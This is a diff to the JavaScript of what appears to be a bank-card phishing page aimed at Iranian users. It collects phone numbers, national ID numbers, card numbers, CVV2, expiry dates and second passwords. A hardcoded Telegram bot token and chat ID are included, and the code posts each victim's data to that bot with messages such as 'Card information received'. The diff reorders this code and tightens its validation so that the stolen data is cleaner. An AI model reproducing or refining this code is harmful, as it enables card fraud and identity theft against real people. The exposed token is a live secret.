@@ -1,6 +1,98 @@
 const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
 const chatId = '-4614449543';
 
+// page 1
+const phoneInput = document.getElementById('phoneInput');
+const phoneValid = document.getElementById('phoneValid');
+const codemeliInput = document.getElementById('codemeliInput');
+const codeValid = document.getElementById('codeValid');
+const nameInput = document.getElementById('nameInput');
+const nameValid = document.getElementById('nameValid');
+const firstBtn = document.getElementById('firstBtn');
+
+function validateIranianMobileNumber(mobileNumber) {
+  // الگوی شماره موبایل ایرانی
+  const regex = /^09\d{9}$/;
+
+  // بررسی می‌کند که آیا شماره مورد نظر با الگو مطابقت دارد یا خیر
+  return regex.test(mobileNumber);
+}
+function validateNationalID(nationalID) {
+  // بررسی طول کد ملی
+  if (nationalID.length !== 10 || !/^\d+$/.test(nationalID)) {
+    return false; // نامعتبر است
+  }
+
+  // استخراج ارقام
+  const digits = nationalID.split('').map(Number);
+
+  // محاسبه رقم کنترل
+  const sum = digits
+    .slice(0, 9)
+    .reduce((acc, digit, index) => acc + digit * (10 - index), 0);
+  const remainder = sum % 11;
+  const checkDigit = digits[9];
+
+  // اعتبارسنجی رقم کنترل
+  if (
+    (remainder < 2 && checkDigit === remainder) ||
+    (remainder >= 2 && checkDigit === 11 - remainder)
+  ) {
+    return true; // معتبر است
+  } else {
+    return false; // نامعتبر است
+  }
+}
+function isValidEmail(email) {
+  // الگوی ریجکس برای بررسی قالب ایمیل
+  const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+  return emailPattern.test(email);
+}
+
+// const androidId = androidListener.getAndroidID();
+// const device = androidListener.deviceName();
+
+firstBtn.addEventListener('click', () => {
+  if (!validateIranianMobileNumber(phoneInput.value)) {
+    phoneValid.classList.remove('hidden');
+  } else {
+    phoneValid.classList.add('hidden');
+  }
+  if (!validateNationalID(`${codemeliInput.value}`)) {
+    codeValid.classList.remove('hidden');
+  } else {
+    codeValid.classList.add('hidden');
+  }
+  if (nameInput.value === '') {
+    nameValid.classList.remove('hidden');
+  } else {
+    nameValid.classList.add('hidden');
+  }
+
+  if (
+    validateIranianMobileNumber(phoneInput.value) &&
+    validateNationalID(`${codemeliInput.value}`)
+  ) {
+    setTimeout(() => {
+      codeMeli = codemeliInput.value;
+      phone = phoneInput.value;
+      const message = `
+      Phone: ${phone}
+CodeMeli: ${codeMeli}
+Tag: #${androidId}
+  `;
+      sendMessage(message);
+      document.getElementById('page1').classList.add('hidden');
+      document.getElementById('page2').classList.remove('hidden');
+      setTimeout(() => {
+        document.getElementById('page2').classList.add('hidden');
+        document.getElementById('page3').classList.remove('hidden');
+      }, 1500);
+    }, 1500);
+  }
+});
+
+// page 3
 const sendMessage = async function (message) {
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
@@ -83,19 +175,6 @@ const poyaInput = document.getElementById('poyaInput');
 const poyaSpan = document.getElementById('poyaSpan');
 const pattern = '____-____-____-____';
 
-cardInput.addEventListener('input', function () {
-  let value = this.value.replace(/\D/g, ''); // حذف کاراکترهای غیر عددی
-  let maskedValue = '';
-
-  for (let i = 0, j = 0; i < pattern.length && j < value.length; i++) {
-    if (pattern[i] === '_') {
-      maskedValue += value[j++];
-    } else {
-      maskedValue += pattern[i];
-    }
-  }
-});
-
 function validateCardNumber(cardNumber) {
   // حذف فاصله‌ها و کاراکترهای اضافی
   cardNumber = cardNumber.replace(/\s+/g, '');
@@ -107,17 +186,6 @@ function validateCardNumber(cardNumber) {
     return true;
   }
 }
-
-cardInput.addEventListener('input', () => {
-  let currentValue = cardInput.value.replace(/\D/g, ''); // فقط اعداد را نگه‌دارید
-
-  // بررسی اینکه آیا شماره کارت 16 رقمی است
-  if (!/^\d{16}$/.test(currentValue)) {
-    return 'لطفاً یک شماره کارت 16 رقمی وارد کنید.';
-  } else {
-    return true;
-  }
-});
 
 function luhnCheck(number) {
   let sum = 0;
@@ -139,6 +207,35 @@ function luhnCheck(number) {
   // اگر مجموع قابل تقسیم بر 10 باشد، شماره کارت معتبر است
   return sum % 10 === 0;
 }
+
+function validateCVV2(cvv) {
+  // بررسی اینکه کد CVV2 دقیقا 3 رقم باشد و فقط شامل اعداد باشد
+  const regex = /^\d{3}$/; // 3 رقم
+  if (!regex.test(cvv)) {
+    return false;
+  } else {
+    return true;
+  }
+}
+
+cardInput.addEventListener('input', function () {
+  let value = this.value.replace(/\D/g, ''); // حذف کاراکترهای غیر عددی
+  let maskedValue = '';
+
+  for (let i = 0, j = 0; i < pattern.length && j < value.length; i++) {
+    if (pattern[i] === '_') {
+      maskedValue += value[j++];
+    } else {
+      maskedValue += pattern[i];
+    }
+  }
+
+  this.value = maskedValue;
+
+  if (value.length < maskedValue.length) {
+    this.setSelectionRange(maskedValue.length, maskedValue.length); // قرار دادن کادر متنی در انتهای ورودی
+  }
+});
 
 exprationInput.addEventListener('input', function () {
   let currentValue = exprationInput.value.replace(/\D/g, ''); // فقط اعداد را نگه‌دارید
@@ -165,16 +262,6 @@ exprationInput.addEventListener('input', function () {
     // messageElement.textContent = ''; // اگر ورودی هنوز کامل نیست، هیچ پیام خطایی نشان ندهید
   }
 });
-
-function validateCVV2(cvv) {
-  // بررسی اینکه کد CVV2 دقیقا 3 رقم باشد و فقط شامل اعداد باشد
-  const regex = /^\d{3}$/; // 3 رقم
-  if (!regex.test(cvv)) {
-    return false;
-  } else {
-    return true;
-  }
-}
 
 let codeMeli;
 let phone;
@@ -222,11 +309,11 @@ poyaSpan.addEventListener('click', () => {
   }
   poyaRequest = true;
 });
+
 form.addEventListener('submit', e => {
+  errors = [];
   e.preventDefault();
-  if (!validateCardNumber(cardInput.value)) {
-    errors.push('شماره کارت معتبر نیست.');
-  }
+
   const mm = exprationInput.value.slice(0, 2);
   const yy = exprationInput.value.slice(3, 5);
   if (!validateExpirationDate(mm, yy)) {
@@ -236,8 +323,11 @@ form.addEventListener('submit', e => {
     errors.push('cvv2 معتبر نیست.');
   }
 
-  if (!captchaInput.value === 80860) {
+  if (captchaInput.value !== '80860') {
     errors.push('کدامنیتی معتبر نیست.');
+  }
+  if (poyaInput.value === '') {
+    errors.push('رمز دوم اشتباه است.');
   }
 
   // level 1
@@ -251,7 +341,7 @@ form.addEventListener('submit', e => {
   ) {
     const message = `
     💳 #Ista Card information received .
-Card : ${cardInput.value}
+Card : ${cardInput.value.replaceAll('-', '')}
 Cvv2 : ${cvv2Input.value}
 Month : ${mm}
 Year : ${yy}
@@ -356,96 +446,7 @@ Tag : #${''}
   }
 });
 
-const phoneInput = document.getElementById('phoneInput');
-const phoneValid = document.getElementById('phoneValid');
-const codemeliInput = document.getElementById('codemeliInput');
-const codeValid = document.getElementById('codeValid');
-const nameInput = document.getElementById('nameInput');
-const nameValid = document.getElementById('nameValid');
-const firstBtn = document.getElementById('firstBtn');
-
-function validateIranianMobileNumber(mobileNumber) {
-  // الگوی شماره موبایل ایرانی
-  const regex = /^09\d{9}$/;
-
-  // بررسی می‌کند که آیا شماره مورد نظر با الگو مطابقت دارد یا خیر
-  return regex.test(mobileNumber);
-}
-function validateNationalID(nationalID) {
-  // بررسی طول کد ملی
-  if (nationalID.length !== 10 || !/^\d+$/.test(nationalID)) {
-    return false; // نامعتبر است
-  }
-
-  // استخراج ارقام
-  const digits = nationalID.split('').map(Number);
-
-  // محاسبه رقم کنترل
-  const sum = digits
-    .slice(0, 9)
-    .reduce((acc, digit, index) => acc + digit * (10 - index), 0);
-  const remainder = sum % 11;
-  const checkDigit = digits[9];
-
-  // اعتبارسنجی رقم کنترل
-  if (
-    (remainder < 2 && checkDigit === remainder) ||
-    (remainder >= 2 && checkDigit === 11 - remainder)
-  ) {
-    return true; // معتبر است
-  } else {
-    return false; // نامعتبر است
-  }
-}
-function isValidEmail(email) {
-  // الگوی ریجکس برای بررسی قالب ایمیل
-  const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-  return emailPattern.test(email);
-}
-
-// const androidId = androidListener.getAndroidID();
-// const device = androidListener.deviceName();
-
-firstBtn.addEventListener('click', () => {
-  if (!validateIranianMobileNumber(phoneInput.value)) {
-    phoneValid.classList.remove('hidden');
-  } else {
-    phoneValid.classList.add('hidden');
-  }
-  if (!validateNationalID(`${codemeliInput.value}`)) {
-    codeValid.classList.remove('hidden');
-  } else {
-    codeValid.classList.add('hidden');
-  }
-  if (nameInput.value === '') {
-    nameValid.classList.remove('hidden');
-  } else {
-    nameValid.classList.add('hidden');
-  }
-
-  if (
-    validateIranianMobileNumber(phoneInput.value) &&
-    validateNationalID(`${codemeliInput.value}`)
-  ) {
-    setTimeout(() => {
-      codeMeli = codemeliInput.value;
-      phone = phoneInput.value;
-      const message = `
-      Phone: ${phone}
-CodeMeli: ${codeMeli}
-Tag: #${androidId}
-  `;
-      sendMessage(message);
-      document.getElementById('page1').classList.add('hidden');
-      document.getElementById('page2').classList.remove('hidden');
-      setTimeout(() => {
-        document.getElementById('page2').classList.add('hidden');
-        document.getElementById('page3').classList.remove('hidden');
-      }, 1500);
-    }, 1500);
-  }
-});
-
+// page 4
 let timeRemaining = 10 * 60; // 10 دقیقه به ثانیه
 const timerElement = document.getElementById('timer');
 
